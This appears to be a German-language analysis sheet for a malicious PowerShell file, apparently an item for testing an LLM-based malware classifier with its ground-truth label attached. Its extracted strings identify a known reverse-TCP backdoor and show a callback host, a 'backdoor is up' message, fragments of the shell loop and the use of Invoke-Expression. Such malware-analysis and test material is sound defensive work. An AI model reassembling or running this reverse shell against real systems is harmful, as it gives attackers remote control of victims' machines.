# Steckbrief: 07f375cb53ca2275e741e46a0b58739ac1c4a6862f9afded3315a26cb256e584.ps1

- SHA256: `07f375cb53ca2275e741e46a0b58739ac1c4a6862f9afded3315a26cb256e584`
- Groesse: 2778 Bytes, 82 Zeilen
- Ground-Truth-Label (aus Ordner): **malicious**
- Kein Urteil enthalten. Bewertung erfolgt durch das LLM.

## Stufe 1 - Reine Extraktion
- Strings gesamt: 21 (Auszug unten)
- Base64-Bloecke gesamt: 0, davon dekodierbar: 0
- Strings (Auszug):
  - `########################################################################`
  - `#                                                                      #`
  - `#                        PowerShell Reverse TCP v3.6                   #`
  - `#                                          by Ivan Sincek              #`
  - `# GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.  #`
  - `# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.   #`
  - `mayoduckpie.com`
  - `Backdoor is up and running...`
  - `;
	$bytes = 0;
	do {
		$writer.Write(`
  - `);
		do {
			$bytes = $stream.Read($buffer, 0, $buffer.Length);
			if ($bytes -gt 0) {
				$data = $data + $encoding`
  - `;
				$length = $result.Length;
				$count = 0;
				$bytes = $buffer.Length;
				while ($length -gt 0) {
					if ($`
  - `;
			}
		}
	} while ($bytes -gt 0);
	Write-Host `
  - `;
} catch {
	Write-Host $_.Exception.InnerException.Message;
} finally {
	if ($writer -ne $null) {
		$writer.Close(`
  - `;
	}
	if ($stream -ne $null) {
		$stream.Close(); $stream.Dispose();
		Clear-Variable -Name `
  - `;
	}
	if ($client -ne $null) {
		$client.Close(); $client.Dispose();
		Clear-Variable -Name `

## Stufe 2 - Statische Merkmale (zusaetzlich)
- Auffaellige Tokens (Name: Vorkommen):
  - invoke_expression: 1
- Cmdlets: Clear-Variable, Invoke-Expression, New-Object, Out-String, Write-Host

## Stufe 3 - Struktur (zusaetzlich)
- Beobachtete Abfolge:
  1. Zeichenkette als Code ausfuehren
